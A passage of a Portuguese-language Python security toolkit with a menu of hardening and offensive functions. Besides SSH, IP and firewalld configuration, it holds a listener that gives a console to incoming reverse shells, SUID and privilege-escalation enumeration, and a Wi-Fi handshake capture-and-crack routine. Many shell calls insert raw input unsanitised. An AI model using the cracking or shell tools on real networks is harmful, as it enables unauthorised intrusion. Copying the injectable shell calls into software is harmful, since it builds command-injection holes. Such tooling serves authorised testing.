    def configure_ssh():
        print('Configuração do servidor SSH...')
        # Configuração do servidor SSH
        with open("/etc/ssh/sshd_config", "a") as f:
            f.write("""
Protocol 2
#Port 22
ClientAliveInterval 360
ClientAliveCountMax 0
MaxAuthTries 3
LoginGraceTime 20
PermitRootLogin no
PermitEmptyPasswords no
PermitUserEnvironment no
#PasswordAuthentication no
X11Forwarding no
PrintMotd no
Banner = /etc/issue.net
#AllowUsers <user>
""")
        os.system("systemctl restart sshd")
        print("Configuração do servidor SSH aplicada com sucesso!")

       

    #############################################
    ## Função para configurar IP ##
    #############################################
    def configure_ip():
        print("Configuração de IP:")
        
        # Definir interface de rede (substitua 'eth0' ou 'enp0s3' com a interface correta)
        interface = input("Digite o nome da interface de rede (exemplo: eth0 ou enp0s3): ")
        
        # Configurar o IP
        ip = input("Digite o IP a ser configurado: ")
        subnet = input("Digite a máscara de sub-rede (exemplo: 255.255.255.0): ")
        os.system(f"ip addr add {ip}/{subnet} dev {interface}")
        
        # Definir o Gateway
        gateway = input("Digite o Gateway: ")
        os.system(f"ip route add default via {gateway}")
        
        # Desabilitar IPv6
        os.system(f"sysctl net.ipv6.conf.{interface}.disable_ipv6=1")
        
        # Configurar DNS
        dns = input("Digite o DNS primário: ")
        os.system(f"echo 'nameserver {dns}' > /etc/resolv.conf")
        
        print("Configuração de IP aplicada com sucesso!")

    #############################################
    ## Função principal que chama as opções ##
    #############################################
    os.system('clear')
    display_header('1.0dev')
    display_menu()

    try:
        opcao = int(input('Escolha uma opção: '))
        if opcao == 1:
            create_rbash_user()
        elif opcao == 2:
            allow_default_bash()
        elif opcao == 3:
            block_commands()
        elif opcao == 4:
            configure_ssh()
        elif opcao == 5:
            configure_ip()
        elif opcao == 0:
            print(r'Volte sempre! ¯\_(ツ)_/¯')
            quit()
        else:
            print('Digite uma opção válida!')
            input(press)
            main()
    except ValueError:
        print('Digite uma opção válida!')
        input(press)
        main()



#-----------------------------------------------------------------------------
def linpeas():
    try:
        sit_linpeas = input('Esta opção pode demorar por muito tempo. Deseja continuar? (S/N) ')
        t.sleep(0.25)
        if(sit_linpeas.lower() == "s"):
            os.system('chmod +x linpeas.sh')
            os.system('./linpeas.sh')
        else:
            input(press)
            main()
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#-----------------------------------------------------------------------------
def linenum():
    try:
        sit_linenum = input('Esta opção pode demorar por muito tempo. Deseja continuar? (S/N) ')
        t.sleep(0.25)
        if(sit_linenum.lower() == "s"):
            os.system('chmod +x LinEnum.sh')
            os.system('./LinEnum.sh')
        else:
            input(press)
            main()
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)

def wazuh():
    print('''\033[1;34m
888       888                                888     
888   o   888                                888     
888  d8b  888                                888     
888 d888b 888   8888b.   88888888  888  888  88888b. 
888d88888b888      "88b     d88P   888  888  888 "88b
88888P Y88888  .d888888    d88P    888  888  888  888
8888P   Y8888  888  888   d88P     Y88b 888  888  888
888P     Y888  "Y888888  88888888  "Y88888   888  888                                                                                    
\033[m''')
    if distro_id in ["ubuntu", "oracle", "rhel"]:
        sit_wazuh = input('Deseja Instalar o Wazuh? (S/N) ')
        if sit_wazuh.lower() == 's':
            comando = "curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh && sudo bash ./wazuh-install.sh -a"
            os.system(comando)
        elif sit_wazuh.lower() == 'n':
            main()
        else:
            main()



#-----------------------------------------------------------------------------
####################################################################
## FUNÇÃO QUE CRIA UM CONFIGURADOR DE FIREWALL COM "firewall-cmd" ##
####################################################################
def waza(distro_id):
    wversion = '\033[7;32mv2.1dev\033[m'
    
    #############################################################
    ## VERIFICA A DISTRO LINUX, INSTALA E HABILITA O FIREWALLD ##
    #############################################################
    def verifica_firewall():
        if distro_id in ["ubuntu", "oracle", "rhel"]:
            status = os.system(" systemctl status firewalld >/dev/null 2>&1")
    
            if status == 0:
                print("Firewalld está instalado e em execução.")
        
            else:
                intalar_firewalld = input(f"O firewalld não está instalado. Deseja instalar o firewalld no {distro_id}? (S/N): ").lower()
            
                if intalar_firewalld == "s":
                    package_manager = "apt" if distro_id == "ubuntu" else "yum"

                    #############################################
                    ## INSTALA, INICIA, E HABILITA O FIREWALLD ##
                    #############################################
                    os.system(f" {package_manager} install firewalld -y")
                    os.system(" systemctl start firewalld")
                    os.system(" systemctl enable firewalld")
                    print("Firewalld instalado e iniciado com sucesso.")
            
                else:
                    print("Firewalld não instalado. Instale manualmente e tente novamente!")

    

    #######################################
    ## FUNÇÃO PARA CONFIGURAR O FIREWALL ##
    #######################################
    verifica_firewall()

    ##############################################################
    ## DEFINE UMA SEQUENCIA DE VARIÁVEIS PARA INTERAÇÃO DO MENU ##
    ############################################################## 
    seleciona_interface = None
    seleciona_zonas_str = None
    selected_services_str = None
    block_selected_services_str = None
    selected_ports_str = None
    block_selected_ports_str = None
    port_list = None
    press = '(Pressione qualquer tecla para voltar ao menu inicial)'
    
    os.system('clear')

    try:
        while True:
            ###########################
            ## BANNER PRA FICAR COOL ##
            ###########################
            print(f'''\033[1;91m
        .DL               ;W,      ,##############Wf.     ;W,
f.     :K#L     LWL      j##,       ........jW##Wt       j##,
EW:   ;W##L   .E#f      G###,             tW##Kt        G###,
E#t  t#KE#L  ,W#;     :E####,           tW##E;        :E####,
E#t f#D.L#L t#K:     ;W#DG##,         tW##E;         ;W#DG##,
E#jG#f  L#LL#G      j###DW##,      .fW##D,          j###DW##,
E###;   L###j      G##i,,G##,    .f###D,           G##i,,G##,
E#K:    L#W;     :K#K:   L##,  .f####Gffffffff;  :K#K:   L##,
EG      LE.     ;##D.    L##, .fLLLLLLLLLLLLi   ;##D.    L##,
                                                    \033[m{wversion}''')
            
            print("Opções:\n")

            #######################################################
            ## LISTAGEM DE OPÇÕES PARA FACILITAR O USUÁRIO.      ##
            ## A LÓGICA É FAZER O USUÁRIO SELECIONAR A INTERFACE ##
            ## E A ZONA E DEPOIS PENSAR EM CONFIGURAR.           ##
            ##                                                   ##
            ## NESTE TRECHO TAMBÉM HÁ ALGUMAS CONDICIONAIS PARA  ##
            ## EXIBIR FEEDBACK DO QUE ESTÁ ACONTECENDO APOS O    ##
            ## USUÁRIO FAZER A SELEÇÃO DAS CONFIGURAÇÕES         ##
            #######################################################
            print(f"\033[0;34m[1]\033[m - Selecionar interface {'(Selecionado: ' + seleciona_interface + ')' if seleciona_interface else ''}")
        
            if seleciona_zonas_str:
                print(f"\033[0;34m[2]\033[m - Selecionar zona (Selecionado:  {seleciona_zonas_str})")
        
            else:
                print(f"\033[0;34m[2]\033[m - Selecionar zona")
        
            if selected_services_str:
                print(f"\033[0;34m[3]\033[m - Liberar serviços (Selecionados: {selected_services_str})")
        
            else:
                print("\033[0;34m[3]\033[m - Liberar serviços")            
        
            if selected_ports_str:
                print(f"\033[0;34m[4]\033[m - Liberar portas (Selecionados: {selected_ports_str})")
        
            else:
                print("\033[0;34m[4]\033[m - Liberar portas ")
        
            if block_selected_services_str:
                print(f"\033[0;34m[5]\033[m - Bloquear serviços (Selecionados: {block_selected_services_str})")
        
            else:
                print("\033[0;34m[5]\033[m - Bloquear serviços")            
        
            if block_selected_ports_str:
                print(f"\033[0;34m[6]\033[m - Bloquear portas (Selecionados: {block_selected_ports_str})")
        
            else:
                print("\033[0;34m[6]\033[m - Bloquear portas ") 
            print(f"\033[0;34m[7]\033[m - Remover interface da Zona")
            print(f"\033[0;34m[8]\033[m - Bloquear IP")
            print(f"\033[0;34m[9]\033[m - Bloquear IPs por Máscara")
            print(f'\033[0;34m[10]\033[m- Listar todas as Zonas')
            print(f"\033[0;34m[11]\033[m- Mostrar Configuração da Zona")
            print(f"\033[0;34m[12]\033[m- Listar IPs bloqueados")
            print("\033[0;34m[13]\033[m- Aplicar Configurações")
            print("\033[0;34m[0]\033[m - Sair")


            opcao = input("\nEscolha uma opção: ")

            ###########################################################
            ## EXIBE UM MENU PARA SELEÇÃO DAS INTERFACES DISPONÍVEIS ##
            ###########################################################
            if opcao == "1":
                interfaces = os.popen("ls /sys/class/net/").read().strip().split()
                print("Interfaces disponíveis:")
            
                for i, iface in enumerate(interfaces, start=1):
                    print(f"[{i}] {iface}")
            
                try:
                    print("[0] Voltar ao Menu")
                    interface_index = int(input("Escolha a interface (número): "))
                
                    if interface_index == 0:
                        seleciona_interface = None
                
                    elif 1 <= interface_index <= len(interfaces):
                        seleciona_interface = interfaces[interface_index - 1]
            
                except (ValueError, IndexError):
                    print("Escolha inválida.")

            ######################################################### 
            ## EXIBE UM MENU PARA SELEÇÃO DAS ZONAS DISPONÍVEIS    ##
            ## AQUI ELE PERMITE MULTISELEÇÃO DAS ZONAS DISPONÍVEIS ##
            #########################################################                  
            elif opcao == "2": 
                    zonas = os.popen("firewall-cmd --get-zones").read().strip().split()
                    print("Zonas disponíveis:")
                
                    for i, zone in enumerate(zonas, start=1):
                        print(f"[{i}] {zone}")
                
                    try:
                        print("[0] Voltar ao Menu")
                        seleciona_zonas = []
                    
                        while True:
                            zone_index = int(input("Escolha a zona (número): "))
                        
                            if zone_index == 0:
                                break
                        
                            elif 1 <= zone_index <= len(zonas):
                                seleciona_zona = zonas[zone_index - 1]
                                seleciona_zonas.append(seleciona_zona)  
                        
                            else:
                                print("Escolha inválida.")
                            seleciona_zonas_str = ', '.join(seleciona_zonas)
                
                    except (ValueError, IndexError):
                        print("Escolha inválida.")

            #########################################################
            ## EXIBE UM MENU PARA SELEÇÃO DOS SERVIÇOS DISPONÍVEIS ##
            ## AQUI ELE PERMITE MULTISELEÇÃO DOS SERVIÇOS          ##
            #########################################################                        
            elif opcao == "3": 
                if seleciona_zona and seleciona_interface:
                    services = os.popen("""firewall-cmd --get-services""").read().strip().split()
                    services = [service.strip() for service in services if service.strip()]
                    print("Escolha os Serviços:")
                
                    for i, service in enumerate(services, start=1):
                        print(f"[{i}] {service}")
                    try:
                        print("[0] Voltar ao Menu")
                        selected_services = []
                        
                        while True:
                            service_index = int(input("Escolha o serviço (número): "))
                        
                            if service_index == 0:
                                break
                        
                            elif 1 <= service_index <= len(services):
                                selected_service = services[service_index - 1]
                                selected_services.append(selected_service)
                            
                            else:
                                print("Escolha inválida.")
                        selected_services_str = ', '.join(selected_services)
                    
                    except (ValueError, IndexError):
                        print("Escolha inválida.")
            
                else:
                    print("Zona ou serviço não selecionado.")
        
            ###########################################################
            ## PEDE UMA ENTRADA DAS PORTAS QUE DESEJA PERMITIR.      ##
            ## AS PORTAS SÃO SEPARADAS POR "," E SENDO ENVIADAS PARA ##
            ## UMA LISTA QUE SERÁ CONFIGURADA MAIS PARA FRENTE       ##
            ###########################################################         
            elif opcao == "4":
                if seleciona_zona:
                    ports = input("Digite a(s) porta(s) desejada(s) separada(s) por vírgula: ")
                    port_list = ports.split(',')
                
                    for index, port in enumerate(port_list):
                        try:
                            port_list[index] = port.strip()
                        except ValueError:
                            print(f"Entrada inválida para a porta: {port}")
                    selected_ports_str = ', '.join(port_list)
                
                else:
                    print("Zona ou serviço não selecionado.")

            #########################################################
            ## EXIBE UM MENU PARA SELEÇÃO DOS SERVIÇOS DISPONÍVEIS ##
            ## AQUI ELE PERMITE MULTISELEÇÃO DOS SERVIÇOS          ##
            #########################################################              
            elif opcao == "5":
                if seleciona_zona:
                    block_services = os.popen("""firewall-cmd --get-services""").read().strip().split()
                    block_services = [block_service.strip() for block_service in block_services if block_service.strip()]
                    print("Escolha os Serviços:")
                
                    for i, block_service in enumerate(block_services, start=1):
                        print(f"[{i}] {block_service}")
                    try:
                        print("[0] Voltar ao Menu")
                        block_selected_services = []
                    
                        while True:
                            block_service_index = int(input("Escolha o serviço (número): "))
                        
                            if block_service_index == 0:
                                break
                        
                            elif 1 <= block_service_index <= len(block_services):
                                block_selected_service = block_services[block_service_index - 1]
                                block_selected_services.append(block_selected_service)
                        
                            else:
                                print("Escolha inválida.")
                        block_selected_services_str = ', '.join(block_selected_services)
                
                    except (ValueError, IndexError):
                        print("Escolha inválida.")
            
                else:
                    print("Zona ou serviço não selecionado.")
            
            ##############################################################
            ## A OPÇÃO 6 SERÁ O PROCESSO INVERSO DA PERMISSÃO DE PORTAS ##
            ##############################################################
            elif opcao == '6':
                pass
            
            #################################################################
            ## PERMITE REMOVER DA ZONA SELECIONADA A INTERFACE SELECIONADA ##
            #################################################################
            elif opcao == "7": 
                if seleciona_zona and seleciona_interface:
                    sit_remove = input(f"Deseja remover a interface {seleciona_interface} da zona {seleciona_zona}. (S/N) ")
                    
                    if sit_remove.lower() == 's':
                        os.system(f"firewall-cmd --zone={seleciona_zona} --permanent --remove-interface={seleciona_interface}")
                        os.system("firewall-cmd --reload")
                        print(f"Interface {seleciona_interface}removida da zona {seleciona_zona}.")
            
                else:
                    print("Selecione a Interface a ser removida e a Zona a ser configurada.")

            ############################################################################
            ## PERMITE BLOQUEAR IP INDIVIDUALMENTE, AINDA NÃO TEM TRATAMENTO COM "RE" ##
            ############################################################################        
            elif opcao == "8":
                bloquear_ip = input("Digite o IP a ser bloqueado: ")
                os.system(f"firewall-cmd --permanent --zone={seleciona_zona} --add-rich-rule='rule family=ipv4 source address={bloquear_ip} drop'")
                print(f"IP {bloquear_ip} bloqueado.")
                input(press)

            ########################################
            ##   PERMITE BLOQUEAR A FAIXA DE IP   ##
            ########################################
            elif opcao == "9":
                ip_mask = input("Digite a faixa de IP a ser bloqueado: ")
                os.system(f"firewall-cmd --permanent --zone={seleciona_zona} --add-rich-rule='rule family=ipv4 source address={ip_mask} drop'")
                print(f"Range de IPs {ip_mask} bloqueado.")
                input(press)

            ##########################
            ## LISTA TODAS AS ZONAS ##
            ##########################
            elif opcao == "10":
                os.system('firewall-cmd --list-all-zones')
                input(press)

            ##############################################
            ## LISTA A CONFIGURAÇÃO DA ZONA SELECIONADA ##
            ##############################################
            elif opcao == "11":
                try:
                    os.system(f'firewall-cmd --zone={seleciona_zona} --list-all')
                    input(press)
                except UnboundLocalError:
                    print('Selecione uma zona.')
                    input(press)
            
            #############################
            ## LISTA OS IPS BLOQUEADOS ##
            #############################
            elif opcao == "12":
                os.system(' iptables -L -n')
                input(press)

            ###############################################################################################
            ## ESTA OPÇÃO CONFIRMA AS ALTERAÇÕES SELECIONADAS, E FAZ ABRE POSSIBILIDADE DE NOVOS AJUSTES ##
            ###############################################################################################
            elif opcao == "13":
                try:
                    ########################################################
                    ## FAZ A ALTERAÇÃO DA INTERFACE PARA ZONA SELECIONADA ##
                    ########################################################
                    if seleciona_zona and seleciona_interface:
                        cfg_iface = os.popen(f"firewall-cmd --zone={seleciona_zona} --change-interface={seleciona_interface} --permanent").read()
                        print(f'Configuração da INTERFACE e ZONA: {cfg_iface}')
                        
                        ##############################################################
                        ## SE O SERVIÇO ESTIVER SELECIONADO, ELE FAZ A CONFIGURAÇÃO ##
                        ##############################################################
                        if selected_services_str != None:
                            selected_services_list = selected_services_str.split(', ')
                        
                            for service in selected_services_list:
                                cfg_service = os.popen(f"firewall-cmd --add-service={service} --permanent --zone={seleciona_zona}").read()
                                print(f'Permissão do serviço {service}: {cfg_service}')
                        
                        ############################################################
                        ## SE A PORTA ESTIVER SELECIONADA, ELE FAZ A CONFIGURAÇÃO ##
                        ############################################################
                        if selected_ports_str != None:
                            selected_ports_str = selected_ports_str.split(',')
                        
                            for port in selected_ports_str:
                                
                                if port != 0 or port != '':
                                    tcp_port = os.popen(f"firewall-cmd --add-port={port}/tcp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {port}/tcp liberada: {tcp_port}')
                                    udp_port = os.popen(f"firewall-cmd --add-port={port}/udp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {port}/udp liberada: {udp_port}')
                        
                        ##########################################################################
                        ## SE O BLOQUEIO DE SERVIÇO ESTIVER SELECIONADO, ELE FAZ A CONFIGURAÇÃO ##
                        ##########################################################################
                        if block_selected_services_str != None:
                            block_selected_services_list = block_selected_services_str.split(', ')
                            
                            for block_service in block_selected_services_list:
                                block_cfg_service = os.popen(f"firewall-cmd --remove-service={block_service} --permanent --zone={seleciona_zona}").read()
                                print(f'Bloqueio do serviço {block_service}: {block_cfg_service}')
                    
                        ##########################################################################
                        ## SE O BLOQUEIO DE SERVIÇO ESTIVER SELECIONADO, ELE FAZ A CONFIGURAÇÃO ##
                        ##########################################################################
                        '''
                        if block_selected_ports_str != None:
                            block_selected_ports_str = block_selected_ports_str.split(',')
                        
                            for block_port in block_selected_ports_str:
                                
                                if block_port != 0 or block_port != '':
                                    block_tcp_port = os.popen(f"firewall-cmd --remove-port={block_port}/tcp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {block_port}/tcp bloqueada: {block_tcp_port}')
                                    block_udp_port = os.popen(f"firewall-cmd --remove-port={block_port}/udp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {block_port}/udp bloqueada: {block_udp_port}')
                        '''
                        #########################################
                        ## ABRE O MENU DE CONFIGURAÇÕES EXTRAS ##
                        #########################################
                        try:
                            while True:
                                print("Configuração manual para a zona:")
                                print('[1] Defina o Target')
                                print("[2] Bloquear ICMP")
                                print("[3] Configurar PortForward")
                                print("[4] Configurar masquerade")
                                print("[0] Concluir")
                                choice = input("Escolha uma opção: ")
                                
                                #############################################
                                ## ABRE O MENU DE CONFIGURAÇÃO DE "TARGET" ##
                                #############################################
                                if choice == "1":
                                    print('[1] Default')
                                    print("[2] ACCEPT")
                                    print("[3] REJECT")
                                    print("[4] DROP")
                                    print("[0] Concluir")
                                    target = int(input('Escolha a opção do Target: '))
                                    
                                    if target == 1:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=default")
                                
                                    if target == 2:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=ACCEPT")
                                
                                    if target == 3:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=REJECT")  
                                
                                    if target == 4:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=DROP")
                                
                                    if target == 0:
                                        pass
                                
                                    else:
                                        print('Digite uma opção válida')

                                #################################################
                                ## ABRE O MENU DE CONFIGURAÇÃO DE "ICMP_BLOCK" ##
                                #################################################
                                if choice == "2":
                                    icmp_options = {
                                        "Echo-Request": "echo-request",
                                        "Echo-Reply": "echo-reply",
                                        "Destination Unreachable": "destination-unreachable",
                                        "Source Quench": "source-quench",
                                        "Redirect": "redirect",
                                        "Time Exceeded": "time-exceeded",
                                        "Parameter Problem": "parameter-problem",
                                        "Timestamp Request/Reply": "timestamp-request",
                                        "Address Mask Request/Reply": "address-mask-request",
                                        "Router Solicitation/Advertisement": "router-solicitation",
                                        "Traceroute": "traceroute"
                                    }
                                    print("\nOpções de bloqueio ICMP:")
                                    
                                    for num, option in enumerate(icmp_options.keys(), start=1):
                                        print(f"{num}. {option}")
                                
                                    try:
                                        option_num = int(input("Digite o número correspondente à opção de ICMP a ser bloqueada: "))
                                    
                                        if 1 <= option_num <= len(icmp_options):
                                            selected_icmp = list(icmp_options.keys())[option_num - 1]
                                            icmp_type = icmp_options[selected_icmp]
                                            os.system(f"firewall-cmd --zone={seleciona_zona} --add-icmp-block={icmp_type}")
                                            os.system("firewall-cmd --reload")
                                            print(f"Comando executado: firewall-cmd --zone={seleciona_zona} --add-icmp-block={icmp_type}")
                                            print(f"ICMP tipo '{selected_icmp}' bloqueado.")
                                    
                                        else:
                                            print("Número de opção inválido.")
                                    except ValueError:
                                        print("Entrada inválida. O número da opção deve ser um número inteiro.")
                            
                            ###############################################################################
                            ## CONFIGURA O PORTFORWARD, DIRECIONANDO O TRAFEGO DE UMA PORTA PARA A OUTRA ##
                            ###############################################################################
                                elif choice == "3":
                                    forward_sit = input("Deseja configurar o PortForward? (S/N) ")
                                    if forward_sit.lower() =='s':
                                        porta_entrada = int(input('Digite a porta de Entrada: '))
                                        porta_destino = int(input('Digite a porta de Destino: '))
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --add-forward-port=port={porta_entrada}:proto=tcp:toport={porta_destino}")
                                        os.system('firewall-cmd --runtim-to-permanent')
                                        print(f"PortForward configurado ({porta_entrada} >> {porta_destino}).")
                                
                                    elif forward_sit.lower() =='n':
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --remove-forward")
                                        print(f"PortForward removido.")
                                    os.system("firewall-cmd --reload")

                                elif choice == "4":
                                    masquerade_value = input("Deseja habilitar o Masquerade? (S/N) ")
                                    os.system(f"firewall-cmd --zone={seleciona_zona} --add-option=masquerade --value={masquerade_value}")
                                    os.system("firewall-cmd --reload")
                                    print(f"Comando executado: firewall-cmd --zone={seleciona_zona} --add-option=masquerade --value={masquerade_value}")
                                    print(f"Masquerade configurado para {masquerade_value}.")

                                elif choice == "0":
                                    break

                                else:
                                    print("Escolha inválida. Tente novamente.")

                        except KeyboardInterrupt:
                            print("\nPrograma encerrado.")
                            os.system('clear')
                        
                        os.system("firewall-cmd --reload")

                    else:
                        print("Zona ou serviço não selecionado.")

                except UnboundLocalError:
                    print("Zona ou serviço não selecionado.")

            elif opcao == "0":
                print("Até a próxima! (ツ)")
                break

            else:
                print("Opção inválida. Tente novamente.")
            os.system('clear')

    except KeyboardInterrupt:
        print("\nPrograma encerrado.")


#=======================================================================================
def suid():
    path = input('Digite o caminho a ser pesquisado: ')
    if (bool(path) == False):
        path = '/'
    print('Este processo pode demorar alguns segundos, aguarde ...\n')
    os.system(f'find {path} -perm -u=s -type f 2>/dev/null')
    input(press)
    main()


#=======================================================================================
def nc():
    porta = int(input('Digite a porta a ser utilizada: '))
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.bind(("", porta))
            s.listen(1)
            print(f"Escutando na porta {porta}")
            conn, addr = s.accept()
            print('Conexão recebida de',addr[0])
            while True:
                ans = conn.recv(1024).decode()
                sys.stdout.write(ans)
                command = input()
                command += "\n"
                conn.send(command.encode())
                t.sleep(0.1)
                sys.stdout.write("\033[A" + ans.split("\n")[-1])
    except OSError:
        print('Esta PORTA está sendo utilizada.')
        porta = int(input("Digite a Porta: "))
        nc(porta)
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)

def reverse_shell():
   pass


#=======================================================================================
def server_tcp():
    try:
        file = open("ARQ/output.txt", "w")
        porta = int(input("Digite a Porta a ser escutada: "))
        try:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                s.bind(("0.0.0.0", porta))
                s.listen(5)
                print("Listening...")
                client_socket, address = s.accept()
                print(f"Received from: {address[0]}")
                data = client_socket.recv(1024).decode()
                file.write(data)
                s.close()
        except Exception as error:
            print("Erro: ", error)
            s.close()
    except FileNotFoundError:
        os.system(dir)
        server_tcp()


#=======================================================================================
######################################
## CRIA UM SERVIDOR WEB COM PYTHON3 ##
######################################
def serverhttp():
    try:
        port = int(input('Qual porta será usada para o HTTP Server? '))
        server = hs.SimpleHTTPRequestHandler
        request = ss.TCPServer(("",port),server)
        print(f"Server HTTP \033[1;32m'ONLINE'\033[m na PORTA: \033[7;33m{port}\033[m")
        print(f'\033[1;33mhttp://127.0.0.1:{port}\n')
        request.serve_forever()

    except OverflowError:
        print('\nDigite uma porta valida. (0 ~ 65535)')
        serverhttp()

    except ValueError:
        print('\nDigite uma porta valida. (0 ~ 65535)')
        serverhttp()

    except PermissionError:
        print('Porta sem permissão.')

    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def wifi_hacking():
    #########################
    ## FUNÇÃO PRINCIPAL    ##
    #########################
    def magic_crack(wordlist_dir):
        try:
            os.system('hcxpcapngtool -o WifiCrack/hash.hc22000 -E essidlist dumpfile.pcapng')
            with open('WifiCrack/hash.hc22000', 'r') as f:
                dump = f.read()
        except FileNotFoundError:
            print('\033[7;31mO arquivo "WifiCrack/*.hc22000" não foi encontrado. Prolongue o DUMP.\033[m')
            exit()

        for hash in dump.splitlines():
            nome_hash = hash.split('*')
            if wordlist_dir:
                for root, dirs, files in os.walk(wordlist_dir):
                    for file in files:
                        if file.endswith(".txt"):
                            full_path = os.path.join(root, file)
                            comando = f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 0 {full_path} | tee WifiCrack/{file}.{nome_hash[3]}.result"
                            t.sleep(0.025)
                            with open(f'WifiCrack/{nome_hash[3]}.hc22000', 'w') as f:
                                f.write(hash)
                            print(nome_hash[3])
                            print('#################################################################################################################')
                            os.system(comando)

    def wifi_crack():
        dependencias = ["hcxdumptool", "hashcat", 'xterm']
        for programa in dependencias:
            if not os.popen(f'which {programa}').read():
                os.system(f"apt install {programa} -y")

        os.system('rm -rf WifiCrack')
        os.system('mkdir WifiCrack')

        sitwifi = input('Já existe o arquivo "WifiCrack/hash.hc22000"? (S/N) ').lower()
        wordlist_dir = input('Digite o PATH das Wordlists CASO queira usar: ')

        if sitwifi == 's':
            magic_crack(wordlist_dir)
        elif sitwifi == 'n':
            minutos = int(input('\033[7;31mQuantos minutos deseja realizar o DUMP? \033[m'))

            os.system('rm dumpfile* essidlist hash.hc22000 2>/dev/null')
            os.system('systemctl stop NetworkManager.service')
            os.system('systemctl stop wpa_supplicant.service')
            
            try:
                t.sleep(1)
                os.system(f'sudo hcxdumptool -i {interfaces()} -w dumpfile.pcapng --tot {minutos}')
            except KeyboardInterrupt:
                print("Processo interrompido pelo usuário.")
            finally:
                os.system('systemctl restart NetworkManager.service')
                os.system('systemctl restart wpa_supplicant.service')
            
            magic_crack(wordlist_dir)
        else:
            print('Entrada inválida.')

    def wifi_scan():
        def scan(selected_iface):
            os.system(f'wash -i {selected_iface} -s -a | tee wash')
            os.system('clear')
            with open('wash', 'r') as file:
                choose_bssid(file.read(), selected_iface)

        def choose_bssid(wash_output, iface):
            lines = wash_output.strip().split('\n')
            print('\nNUM   BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID')
            for i, line in enumerate(lines[2:], start=1):
                print(f"\033[0;34m[{i}]\033[m - {line}")

            selected_number = int(input("\nEscolha o número do BSSID desejado: "))
            if 1 <= selected_number <= len(lines) - 2:
                bssid = lines[selected_number + 1].split()[0]
                print(f"BSSID escolhido: \033[7;33m{bssid}\033[m")
            else:
                print("Número inválido. Tente novamente.")

        dependencias = ["aircrack-ng", "bully"]
        for dep in dependencias:
            if not os.popen(f'which {dep}').read():
                os.system(f'apt install {dep} -y')

        ifaces = os.popen("ip a | grep BROADCAST | awk '{print $2}' | sed 's/://'").read().split()
        for i, iface in enumerate(ifaces, start=1):
            print(f'\033[0;34m[{i}]\033[m - {iface}')

        selected_iface = ifaces[int(input('Escolha uma interface: ')) - 1]
        scan(selected_iface)

    def main_menu():
        while True:
            print("""\n
==========================
MENU DE ATAQUES WI-FI
==========================
[1] Cracking de Wi-Fi (Hashcat)
[2] Escaneamento de Redes (Wash)
[0] Sair
            """)
            opcao = input("Escolha uma opção: ")

            if opcao == "1":
                wifi_crack()
            elif opcao == "2":
                wifi_scan()
            elif opcao == "0":
                print("Encerrando...")
                break
            else:
                print("Opção inválida! Tente novamente.")
                t.sleep(2)

    main_menu()


#-----------------------------------------------------------------------------
#################################################
## CRIA UM BANNER COM MENU DAS OPÇÕES DE TESTE ##
#################################################
def banner():
    try:
        os.system("clear")
        print(bann)
        print(''' MENU:

 \033[0;34m[1]\033[m - Host Discovery
 \033[0;34m[2]\033[m - Port Scanner
 \033[0;34m[3]\033[m - World Scanner
 \033[0;34m[4]\033[m - BannerGrab
 \033[0;34m[5]\033[m - Web Discovery + Subdomain
 \033[0;34m[6]\033[m - WebCrawler (Bugs)
 \033[0;34m[7]\033[m - FormWeb
 \033[0;34m[8]\033[m - WifiHacking
 \033[0;34m[9]\033[m - Instalar Ferramentas
 \033[0;34m[10]\033[m- Clonar Part|Disk
 \033[0;34m[11]\033[m- CronTab
 \033[0;34m[12]\033[m- Finder
 \033[0;34m[13]\033[m- EnumLinux Auditor
 \033[0;34m[14]\033[m- Config. Hardening
 \033[0;34m[15]\033[m- LinPeas
 \033[0;34m[16]\033[m- LinEnum
 \033[0;34m[17]\033[m- Instalar Wazuh
 \033[0;34m[18]\033[m- Waza
 \033[0;34m[19]\033[m- SUID
 \033[0;34m[20]\033[m- Conn. Listen
 \033[0;34m[21]\033[m- Reverse Shell
 \033[0;34m[22]\033[m- Server TCP
 \033[0;34m[23]\033[m- ServerHTTP
 \033[0;34m[0]\033[m - Sair
''')
        options = {
        1: host_discovery,
        2: big_scan,
        3: world_scan,
        4: nc_get,
        5: webdiscovery,
        6: link,
        7: auto_web,
        8: wifi_hacking,
        9: ferramentas,
        10: clonar,
        11: cron,
        12: finder,
        13: infosys,
        14: config,
        15: linpeas,
        16: linenum,
        17: wazuh,
        18: waza,
        19: suid,
        20: nc,
        21: reverse_shell,
        22: server_tcp,
        23: serverhttp,
        0: lambda: print(r'Volte sempre! ¯\_(ツ)_/¯') or quit
        }

        opcao = int(input('Escolha uma opção: '))
        funcao = options.get(opcao)

        if funcao:
            funcao()

        elif opcao > 24:
            print('Digite uma opção válida!')
            input("Pressione Enter para continuar...")
            main()

    except ValueError:
        print('Digite uma opção válida!')
        input(press)
        main()


    
#-----------------------------------------------------------------------------
################################
## FUNÇÃO PRINCIPAL DO CÓDIGO ##
################################
def main():
    try:
        banner()

    except (KeyboardInterrupt):
        print('\n'+Ctrl_C)

    except ValueError:
            print('Digite a opção correta.')
            input(press)
            main()
    except SyntaxWarning:
        pass



#-----------------------------------------------------------------------------
###########################################
## VERIFICA SE ESTÁ EXECUTANDO COMO ROOT ##
###########################################
if os.geteuid() == 0:

############################################
## VERIFICA SE AS BIBLIOTECAS NECESSÁRIAS ##
############################################

    #####################################
    ## VERIFICA SE PIP3 ESTÁ INSTALADO ##
    #####################################
    pip_installed = os.system('pip3 --version >/dev/null 2>&1') == 0
    print('Algumas dependências serão instaladas')

    ########################
